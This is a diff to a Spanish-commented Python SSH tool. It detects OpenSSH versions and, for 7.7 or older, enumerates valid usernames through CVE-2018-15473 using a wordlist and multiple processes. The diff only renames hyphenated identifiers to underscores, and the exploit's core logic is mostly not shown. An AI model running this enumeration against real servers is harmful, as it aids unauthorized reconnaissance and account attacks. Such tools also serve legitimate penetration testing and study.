@@ -179,7 +179,7 @@ def fDetectarVersionSSH(pHostname, pPort):
   return vProduct, vVersionStr
 
 
-# ------ Bloque CVE-2018-15473 (OpenSSH <= 7.7) ------
+# ------ Bloque CVE_2018_15473 (OpenSSH <= 7.7) ------
 
 """
 CVE-2018-15473
@@ -190,12 +190,12 @@ auth2-gss.c, auth2-hostbased.c, and auth2-pubkey.c.
 
 Author: epi
     https://epi052.gitlab.io/notes-to-self/
-    https://gitlab.com/epi052/cve-2018-15473
+    https://gitlab.com/epi052/CVE_2018_15473
 """
 
 
 class InvalidUsername(Exception):
-  """ Raise when username not found via CVE-2018-15473. """
+  """ Raise when username not found via CVE_2018_15473. """
 
 
 def fApplyMonkeyPatch() -> None:
@@ -254,7 +254,7 @@ def fCreateSocket(pHostname: str, pPort: int) -> Union[socket.socket, None]:
     print(f'socket error: {e}', file=sys.stdout)
 
 
-def fConnectCVE-2018-15473(pUsername: str, pHostname: str, pPort: int, pVerbose: bool = False) -> None:
+def fConnectCVE_2018_15473(pUsername: str, pHostname: str, pPort: int, pVerbose: bool = False) -> None:
   """ Connect and attempt keybased auth, result interpreted to determine valid username.
 
   Args:
@@ -287,19 +287,19 @@ def fConnectCVE-2018-15473(pUsername: str, pHostname: str, pPort: int, pVerbose:
     print(f'[-] {Color.mString(pUsername, pColor="red")} not found')
 
 
-def fEnumerarCVE-2018-15473(pHostname, pPort, pUsername, pWordlist, pThreads, pVerbose):
-  """Enumera usuarios usando CVE-2018-15473 (OpenSSH <= 7.7)."""
+def fEnumerarCVE_2018_15473(pHostname, pPort, pUsername, pWordlist, pThreads, pVerbose):
+  """Enumera usuarios usando CVE_2018_15473 (OpenSSH <= 7.7)."""
   fApplyMonkeyPatch()
 
   if pUsername:
     vUsername = pUsername.strip()
-    return fConnectCVE-2018-15473(pUsername=vUsername, pHostname=pHostname, pPort=pPort, pVerbose=pVerbose)
+    return fConnectCVE_2018_15473(pUsername=vUsername, pHostname=pHostname, pPort=pPort, pVerbose=pVerbose)
 
   with multiprocessing.Pool(pThreads) as vPool, Path(pWordlist).open() as vUsernames:
-    vPool.starmap(fConnectCVE-2018-15473, [(vUser.strip(), pHostname, pPort, pVerbose) for vUser in vUsernames])
+    vPool.starmap(fConnectCVE_2018_15473, [(vUser.strip(), pHostname, pPort, pVerbose) for vUser in vUsernames])
 
 
-# ------ Fin bloque CVE-2018-15473 ------
+# ------ Fin bloque CVE_2018_15473 ------
 
 
 # ------ Aquí se agregarán futuros bloques de CVE para otras versiones de SSH ------
@@ -337,11 +337,11 @@ def fMain(**pKwargs):
 
     vVersion = float(vRegex.group(1))
 
-    # CVE-2018-15473: OpenSSH <= 7.7
+    # CVE_2018_15473: OpenSSH <= 7.7
     if vVersion <= 7.7:
-      print(f"[+] OpenSSH {Color.mString(vVersion, pColor='green')} es vulnerable a {Color.mString('CVE-2018-15473', pColor='green')}")
+      print(f"[+] OpenSSH {Color.mString(vVersion, pColor='green')} es vulnerable a {Color.mString('CVE_2018_15473', pColor='green')}")
       print(f"[*] Procediendo con enumeración de usuarios...\n")
-      fEnumerarCVE-2018-15473(
+      fEnumerarCVE_2018_15473(
         pHostname=vHostname,
         pPort=vPort,
         pUsername=vUsername,
